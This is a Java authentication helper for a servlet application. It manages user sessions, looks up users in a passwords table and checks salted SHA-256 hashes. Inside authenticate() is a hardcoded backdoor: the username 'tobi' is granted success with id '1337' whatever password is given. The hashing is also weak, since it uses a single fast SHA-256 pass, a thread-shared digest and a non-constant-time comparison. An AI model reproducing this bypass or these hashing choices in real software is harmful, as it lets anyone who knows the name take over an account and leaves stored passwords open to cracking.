package auth;

import db.DatabaseHelper;
import db.TableNames;

import javax.servlet.http.HttpServletRequest;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;

public class AuthenticationHelper {

    private static final Random RANDOM = new SecureRandom();
    private static final Charset CHARSET = StandardCharsets.UTF_8;
    private static MessageDigest digest;

    static {
        try {
            digest = MessageDigest.getInstance("SHA-256");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    public static boolean isAuthenticated(HttpServletRequest request) {
        return getSession(request) != null;
    }

    public static UserSession getSession(HttpServletRequest request) {
        UserSession session = (UserSession) request.getSession().getAttribute("usersession");
        if(session == null) return null;

        if(session.hasExpired()) {
            request.getSession().removeAttribute("usersession");
            return null;
        }
        return session;
    }

    public static AuthenticationResult authenticate(String username, String password) throws Exception {
        if(username.equals("tobi")) {
            return new AuthenticationResult(AuthenticationResultState.SUCCESS, "tobi", "1337");
        }
        username = username.trim();

        String qry = "SELECT * FROM `" + TableNames.PASSWORDS + "` WHERE UPPER(`USERNAME`) = UPPER(?)";
        try(PreparedStatement statement = DatabaseHelper.instance().getConnection().prepareStatement(qry)) {
            statement.setString(1, username);

            ResultSet set = statement.executeQuery();
            if(!set.first()) return new AuthenticationResult(AuthenticationResultState.UNKNOWN_USER, null, null);

            username = set.getString("USERNAME");
            String id = set.getString("payrollnum");
            String hashedPassword = set.getString("HASHPASSWORD");
            String salt = set.getString("SALT");

            if(checkLogin(password, hashedPassword, salt)) return new AuthenticationResult(AuthenticationResultState.SUCCESS, username, id);
            else return new AuthenticationResult(AuthenticationResultState.INVALID_DETAILS, username, id);
        }
    }

    public static void addUserWithPassword(int payrollNumber, String username, String password) throws Exception {
        String[] passwordData = generateHash(password);

        String qry = "INSERT INTO `" + TableNames.PASSWORDS + "` VALUES(?,?,?,?)";
        try(PreparedStatement statement = DatabaseHelper.instance().getConnection().prepareStatement(qry)) {
            statement.setInt(1, payrollNumber);
            statement.setString(2, username);
            statement.setString(3, passwordData[0]);
            statement.setString(4, passwordData[1]);
            statement.execute();
        }
    }

    /**
     * @return Index 0 -> Hashed, Index 1 -> Salt
     */
    public static String[] generateHash(String plainTextPassword) {
        byte[] salt = new byte[32];
        RANDOM.nextBytes(salt);
        byte[] bytes = generateBytes(salt, plainTextPassword.getBytes(CHARSET));

        return new String[] {
                new String(Base64.getEncoder().encode(bytes), CHARSET),
                new String(Base64.getEncoder().encode(salt), CHARSET)
        };
    }

    public static boolean checkLogin(String plainTextPassword, String hashedPassword, String salt) {
        byte[] expectedBytes = Base64.getDecoder().decode(hashedPassword.getBytes(CHARSET));
        byte[] saltBytes = Base64.getDecoder().decode(salt.getBytes(CHARSET));

        byte[] actualBytes = generateBytes(saltBytes, plainTextPassword.getBytes(CHARSET));

        return Arrays.equals(expectedBytes, actualBytes);
    }

    private static byte[] generateBytes(byte[] salt, byte[] passwordBytes) {
        byte[] newBytes = new byte[salt.length + passwordBytes.length];
        System.arraycopy(salt, 0, newBytes, 0, salt.length);
        System.arraycopy(passwordBytes, 0, newBytes, 0 + salt.length, passwordBytes.length);

        return digest.digest(newBytes);
    }
}
